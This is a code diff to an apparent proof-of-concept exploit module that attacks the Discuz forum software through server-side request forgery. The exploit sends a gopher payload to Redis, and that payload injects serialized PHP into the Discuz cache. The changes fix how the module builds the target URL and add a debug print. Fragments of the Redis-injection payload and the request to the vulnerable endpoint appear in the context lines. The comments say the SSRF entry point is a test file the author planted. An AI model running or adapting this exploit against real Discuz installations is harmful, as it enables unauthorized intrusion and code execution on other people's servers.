@@ -50,7 +50,12 @@ class TestPOC(POCBase):
                    ' end;return 1;" 0 %250D%250Aquit')
         #
         tmpparse = urlparse.urlparse(self.url)
-        self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' +tmpparse.path.split('/')[1]
+        if tmpparse.path != '':    
+            self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' + tmpparse.path.split('/')[1]
+            #self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' +(tmpparse.path.split('/')[1],tmpparse.path.split('/')[0])['/' in tmpparse.path]
+        else:
+            self.url = tmpparse.scheme + '://'+ tmpparse.netloc
+        
         vul_url = self.url + '/' + ssrf_url + payload
 
         base_rep = req.get(vul_url)
@@ -93,6 +98,7 @@ class TestPOC(POCBase):
         #!!!!The ssrf_url is one file i put it in discuz for test.
         #!!!!One day you find the real ssrf in discuz you can change the ssrf_url to work well;
         ###
+        print self.url
         ssrf_url = "ssrf_gopher.php?ssrf="
         result = {}
         #Write your code here
@@ -107,8 +113,12 @@ class TestPOC(POCBase):
                    's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'\
                    ' end;return 1;" 0 %250D%250Aquit')
         
-        tmpparse = urlparse.urlparse(self.url) 
-        self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' +tmpparse.path.split('/')[1]
+        tmpparse = urlparse.urlparse(self.url)
+        if tmpparse.path != '':    
+            self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' + tmpparse.path.split('/')[1]
+            #self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' +(tmpparse.path.split('/')[1],tmpparse.path.split('/')[0])['/' in tmpparse.path]
+        else:
+            self.url = tmpparse.scheme + '://'+ tmpparse.netloc
         vul_url = self.url + '/' + ssrf_url + payload
  
         
